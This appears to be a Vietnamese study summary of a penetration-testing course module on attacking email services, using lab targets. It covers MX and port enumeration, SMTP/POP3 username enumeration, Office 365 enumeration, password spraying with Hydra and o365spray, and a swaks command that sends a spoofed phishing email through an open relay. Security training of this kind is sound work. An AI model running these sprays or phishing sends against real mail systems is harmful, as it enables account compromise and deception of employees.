# Tấn công Dịch vụ Email (Attacking Email Services) — Tóm tắt đầy đủ

## Tổng quan

**Mail server** xử lý và chuyển phát email qua mạng. Quá trình hoạt động:

1. **Gửi email:** Client kết nối đến **SMTP server** (Simple Mail Transfer Protocol) để gửi.
2. **Nhận email:** Client kết nối đến **POP3** hoặc **IMAP4** server để tải về.

**Khác biệt POP3 vs IMAP4:**

| Giao thức | Hành vi mặc định | Truy cập đa thiết bị |
|-----------|-------------------|----------------------|
| **POP3** | Xóa email khỏi server sau khi tải | Khó khăn |
| **IMAP4** | Giữ email trên server | Dễ dàng |

## 1. Thu thập thông tin (Enumeration)

### Xác định Mail Server qua MX Record

```bash
# host
host -t MX hackthebox.eu
# Kết quả: aspmx.l.google.com (G-Suite)

host -t MX microsoft.com
# Kết quả: microsoft-com.mail.protection.outlook.com (Microsoft 365)

# dig
dig mx plaintext.do | grep "MX" | grep -v ";"
# Kết quả: mx.zoho.com, mx2.zoho.com, mx3.zoho.com (Zoho)

# Xác định IP của mail server tự host
host -t A mail1.inlanefreight.htb
```

Thông tin MX record cho biết công ty dùng dịch vụ cloud (G-Suite, Microsoft 365, Zoho) hay mail server tự host — quyết định phương pháp tấn công.

### Các cổng cần quét cho mail server tự host

| Cổng | Dịch vụ |
|------|---------|
| TCP/25 | SMTP không mã hóa |
| TCP/143 | IMAP4 không mã hóa |
| TCP/110 | POP3 không mã hóa |
| TCP/465 | SMTP mã hóa |
| TCP/587 | SMTP mã hóa / STARTTLS |
| TCP/993 | IMAP4 mã hóa |
| TCP/995 | POP3 mã hóa |

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

## 2. Cấu hình sai — Liệt kê Username

### Lệnh SMTP để liệt kê username

#### VRFY — kiểm tra username có tồn tại

```
telnet 10.10.110.20 25
VRFY root        → 252 2.0.0 root (tồn tại)
VRFY new-user    → 550 5.1.1 User unknown (không tồn tại)
```

#### EXPN — mở rộng danh sách phân phối

```
EXPN support-team
→ 250 carol@inlanefreight.htb
→ 250 elisa@inlanefreight.htb
```

Nguy hiểm hơn VRFY vì tiết lộ toàn bộ thành viên của alias như "all".

#### RCPT TO — xác định người nhận

```
MAIL FROM:test@htb.com
RCPT TO:john    → 250 Recipient ok (tồn tại)
RCPT TO:julio   → 550 User unknown (không tồn tại)
```

#### POP3 — lệnh USER

```
telnet 10.10.110.20 110
USER julio    → -ERR (không tồn tại)
USER john     → +OK (tồn tại)
```

### Tự động hóa bằng smtp-user-enum

```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

| Tùy chọn | Mô tả |
|-----------|-------|
| `-M` | Chế độ: VRFY, EXPN hoặc RCPT |
| `-U` | File danh sách username |
| `-D` | Domain email |
| `-t` | IP mục tiêu |

## 3. Cloud Enumeration (Office 365)

### O365spray — liệt kê username trên Microsoft 365

**Xác nhận domain dùng O365:**

```bash
python3 o365spray.py --validate --domain msplaintext.xyz
```

**Liệt kê username:**

```bash
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

## 4. Tấn công Mật khẩu (Password Attacks)

### Hydra — brute force / password spray

```bash
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

Hỗ trợ các giao thức: SMTP, POP3, IMAP4.

> **Lưu ý:** Dịch vụ cloud thường chặn các công cụ thông thường. Sử dụng công cụ chuyên biệt:
> - **O365spray / MailSniper** — cho Microsoft Office 365
> - **CredKing** — cho Gmail hoặc Okta

### O365spray — password spraying trên Office 365

```bash
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

| Tùy chọn | Mô tả |
|-----------|-------|
| `--spray` | Chế độ password spray |
| `-U` | File username đã tìm được |
| `-p` | Mật khẩu thử |
| `--count` | Số mật khẩu thử mỗi đợt |
| `--lockout` | Thời gian chờ giữa các đợt (phút) |

> Các công cụ này cần được cập nhật thường xuyên vì nhà cung cấp cloud thường thay đổi cơ chế, khiến tool ngừng hoạt động.

## 5. Tấn công theo giao thức — Open Relay

### Khái niệm

**Open Relay** là SMTP server được cấu hình sai, cho phép **chuyển tiếp email không xác thực**. Email từ bất kỳ nguồn nào đều được chuyển tiếp qua server, che giấu nguồn gốc thật sự — trông như email xuất phát từ chính server đó.

### Phát hiện Open Relay

```bash
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

### Khai thác — gửi email phishing

Dùng **swaks** để gửi email qua open relay server:

```bash
swaks --from notifications@inlanefreight.com \
      --to employees@inlanefreight.com \
      --header 'Subject: Company Notification' \
      --body 'Hi All, please complete the survey: http://mycustomphishinglink.com/' \
      --server 10.10.11.213
```

Kẻ tấn công có thể:
- Giả mạo địa chỉ email nội bộ của công ty
- Gửi email phishing trông như thông báo chính thức
- Nhân viên nhìn thấy email từ địa chỉ quen thuộc → tin tưởng và click link

## Tóm tắt các phương pháp tấn công Email

| Phương pháp | Công cụ | Mục đích |
|-------------|---------|----------|
| **MX Record Enumeration** | host, dig, MXToolbox | Xác định loại mail server (cloud/self-hosted) |
| **Port Scanning** | Nmap | Phát hiện dịch vụ SMTP/POP3/IMAP4 |
| **Username Enumeration (SMTP)** | telnet (VRFY/EXPN/RCPT TO), smtp-user-enum | Liệt kê username hợp lệ |
| **Username Enumeration (POP3)** | telnet (USER) | Kiểm tra user tồn tại |
| **Cloud Enumeration** | O365spray | Liệt kê username trên Office 365 |
| **Password Spray/Brute Force** | Hydra, O365spray, MailSniper, CredKing | Dò mật khẩu |
| **Open Relay** | Nmap (`smtp-open-relay`), swaks | Gửi email phishing giả mạo |
